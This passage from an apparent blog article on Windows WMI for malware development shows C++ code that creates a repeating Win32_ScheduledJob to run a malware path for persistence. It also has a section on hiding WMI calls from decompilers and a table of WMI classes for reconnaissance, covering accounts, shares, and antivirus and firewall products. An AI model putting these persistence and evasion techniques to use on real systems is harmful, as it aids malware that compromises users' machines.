hr = services->GetObjectW(
    _bstr_t(L"Win32_ScheduledJob"),
    0, NULL,
    function.GetAddressOf(),
    NULL
);

hr = function->GetMethod(
    L"Create", 0, method.GetAddressOf(), NULL
);

hr = method->SpawnInstance(0, &amp;params);

VARIANT var;
VariantInit(&var);

// I will omit initialization/clearing of the variants here
// just know that it IS required

var.vt = VT_BSTR;
var.bstrVal = _bstr_t(L"Path\\To\\My\\Super\\Bad\\Malware");
params->Put(L"Command", 0, &var, 0);

// Dates are in this format, with no delimiters:
// [year][month][day][hour][minute]00.000000-000
var.bstrVal = _bstr_t(L"20250101000000.000000-000");

params->Put(L"StartTime", 0, &var, 0);

var.vt = VT_BOOL;
var.boolVal = TRUE;

params->Put(L"RunRepeatedly", 0, &var, 0);

InterfacePtr&lt;IWbemClassObject> retObj = nullptr;

hr = services->ExecMethod(
    _bstr_t(L"Win32_ScheduledJob"),
    _bstr_t(L"Create"),
    0, NULL,
    params.Get(),
    retObj.GetAddressOf(),
    NULL
);
                </code></pre>

            </section>
            <section id="evasion">
                <h2>Evasion: WMI Interfaces</h2>        
                <p>One great thing about WMI is that is makes extensive use of interfaces. You have a service? That's an interface. You have an object? That's an interface. This allows for massive flexibility when developing applications.</p> 
                <h3>Virtual Function Calls: A Review</h3>
                <p>C++ makes use of a "vtable". This contains a table of function pointers pointing to member functions of concrete classes. If a class contains a virtual function, the compiler will create an entry in the vtable. However, this is not the case for classes wholly consisting of pure virtual functions, as is the case with WMI Interfaces. When we compile code that uses <code>IWbemLocator</code>, there is no references to it or its functions in the executable, including the vtable.
                <h3>Speculation about COM VTables</h3>
                <p>Classes that use virtual functions contain a hidden member variable called <code>_vptr</code>. Based on some analysis, my guess is that <code>CoCreateInstance</code> will set this value to the vtable of the concrete class, therefore hiding what we are doing. Even with symbols loaded from Microsoft's symbol server, decompilers like Ghidra can't make out the function calls for WMI Interfaces.</p>
            </section>
            <section id="misc">
                <h2>Other Useful WMI Objects</h2>
                <table>
                    <thead>
                        <th scope="col">Object Name</th>
                        <th scope="col">Namespace</th>
                        <th scope="col">Requires Admin?</th>
                        <th scope="col">Description</th>
                    </thead>
                    <tbody>
                        <tr>
                            <td><a href="https://learn.microsoft.com/en-us/windows/win32/wmisdk/win32-installedstoreprogram">Win32_InstalledStoreProgram</a></td>
                            <td>ROOT\CIMv2</td>
                            <td>Yes</td>
                            <td>Lists installed Windows Store Programs</td>
                        </tr>
                        <tr>
                            <td><a href="https://learn.microsoft.com/en-us/windows/win32/wmisdk/win32-installedwin32program">Win32_InstalledWin32Program</a></td>
                            <td>ROOT\CIMv2</td>
                            <td>Yes</td>
                            <td>Lists installed Programs with versions</td>
                        </tr>
                        <tr>
                            <td><a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/wmiiprouteprov/win32-ip4routetable">Win32_IP4RouteTable</a></td>
                            <td>ROOT\CIMv2</td>
                            <td>No</td>
                            <td>Shows ALL IPv4 Routes</td>
                        </tr>
                        <tr>
                            <td><a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/cimwin32a/win32-ntdomain">Win32_NTDomain</a></td>
                            <td>ROOT\CIMv2</td>
                            <td>No</td>
                            <td>Lists pretty much everything you want to know about a domain</td>
                        </tr>
                        <tr>
                           <td><a href="https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share">Win32_Share</a></td> 
                           <td>ROOT\CIMv2</td>
                           <td>No</td>
                           <td>Lists all network shares</td>
                        </tr>
                        <tr>
                            <td><a href="https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-useraccount">Win32_UserAccount</a></td>
                            <td>ROOT\CIMv2</td>
                            <td>No</td>
                            <td>Lists all accounts with information about passwords, status, SIDs, etc.</td>
                        </tr>
                        <tr>
                            <td>AntiVirusProduct</td>
                            <td>ROOT\SecurityCenter and ROOT\SecurityCenter2</td>
                            <td>Yes</td>
                            <td>Lists all Anti Virus Products</td>
                        </tr>
                        <tr>
                            <td>FirewallProduct</td>
                            <td>ROOT\SecurityCenter and ROOT\SecurityCenter2</td>
                            <td>Yes</td>
                            <td>Lists all third party Firewall products</td>
                        </tr>
                    </tbody>
                </table>
            </section>
            <section id="closing-thoughts">
                <h2>Closing Thoughts</h2>
                <p>Before writing this article, I had not interacted with WMI much. It is a fascinating and enormous subsystem of Windows.</p>
                <h4><i>What do I need to make C++ Managed Applications?</i></h4>
                <p>A C++ Compiler that can link with Microsoft's libraries. I recommend MSVC.</p>
                <h4><i>Help, I’ve been arrested by the FBI for using YOUR ideas in MY malware!</i></h4>
                <p>🤷‍♂️</p>
                <h4><i>Special Thanks</i></h4>
                <ul>
                    <li>Andrew Heishman - Giving me the idea for this article</li>
                    <li>Pavel Yosifovich - Demonstrated the Mutex example in the Windows Internals course</li>
                </ul>
                <h4><i>Some Resources</i></h4>
                <ul>
                    <li>Windows Internals Parts 1 and 2 (part 2 covers WMI)</li>
                    <li><a href="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/">Pentest Labs Blog about WMI event subscription</a></li>
                    <li><a href="https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-c---application-examples">WMI Application Examples from Microsoft</a></li>
                    <li><a href="https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-error-constants">WMI Error codes for debugging</a></li>
                    <li><a href="https://github.com/vinaypamnani/wmie2">WMI Explorer</a>: A nifty app for viewing WMI classes/instances</li>
                </ul>
            </section>
        </div>  
    </div>

    </body>
</html>